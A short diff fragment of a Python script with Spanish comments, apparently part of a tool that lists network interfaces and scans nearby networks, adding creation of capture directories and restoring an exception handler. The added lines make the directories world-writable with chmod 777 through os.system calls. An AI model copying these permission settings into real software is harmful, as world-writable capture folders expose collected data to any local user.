+        if not os.path.exists("captures"):
+            os.makedirs("captures")
+            os.system('chmod 777 captures')
+        if not os.path.exists("espec"):
+            os.makedirs("espec")
+            os.system('chown root:supervisor espec')
+            os.system('chmod 777 espec')
+
         # Tenemos las herraientas?
         check_utilities()
 
         # Listamos interfaces
         list_save_interf()
 
         # Escanemos redes cercanas
@@ -494,14 +588,14 @@
         # Borramos datos
         exiting(err="done")
 
     # Salida manual
     except KeyboardInterrupt:
         exiting(err=False)
 
-    """# Salida por error
+    # Salida por error
     except Exception as e:
-        exiting(err=e)"""
+        exiting(err=e)
 
 
 if __name__ == "__main__":
     main()
```

